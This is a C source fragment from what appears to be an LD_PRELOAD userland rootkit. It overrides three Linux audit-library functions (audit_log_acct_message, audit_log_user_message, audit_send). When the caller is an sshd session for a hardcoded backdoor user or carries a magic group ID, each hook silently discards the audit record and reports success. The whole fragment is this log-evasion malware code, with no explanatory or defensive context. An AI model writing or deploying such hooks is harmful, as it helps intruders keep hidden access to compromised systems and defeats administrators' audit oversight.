int audit_log_acct_message(int audit_fd, int type, const char *pgname, const char *op, const char *name, unsigned int id, const char *host, const char *addr, const char *tty, int result) {
  if (!libc) libc = dlopen (LIBC_PATH, RTLD_LAZY);
  if (!old_audit_log_acct_message) old_audit_log_acct_message = dlsym (RTLD_NEXT, "audit_log_acct_message");
  if(strstr(get_my_procname(), "sshd: " BD_USER ) || getgid() == MAGIC_GID) {
    setgid(MAGIC_GID);
    return 0;
  }
  return old_audit_log_acct_message(audit_fd,type,pgname,op,name,id,host,addr,tty,result);
}


int audit_log_user_message(int audit_fd, int type, const char *message, const char *hostname, const char *addr, const char *tty, int result) {
  if (!libc) libc = dlopen (LIBC_PATH, RTLD_LAZY);
  if (!old_audit_log_user_message) old_audit_log_user_message = dlsym (RTLD_NEXT, "audit_log_user_message");
  if(strstr(get_my_procname(), "sshd: " BD_USER ) || getgid() == MAGIC_GID) {
    setgid(MAGIC_GID);
    return 0;
  }
  return old_audit_log_user_message(audit_fd,type,message,hostname,addr,tty,result);
}
int audit_send(int fd, int type, const void *data, unsigned int size) { 
  if (!libc) libc = dlopen (LIBC_PATH, RTLD_LAZY);
  if (!old_audit_send) old_audit_send = dlsym (RTLD_NEXT, "audit_send");
  if(strstr(get_my_procname(), "sshd: " BD_USER ) || getgid() == MAGIC_GID) {
    setgid(MAGIC_GID);
    return 0;
  }
  return old_audit_send(fd,type,data,size);
}
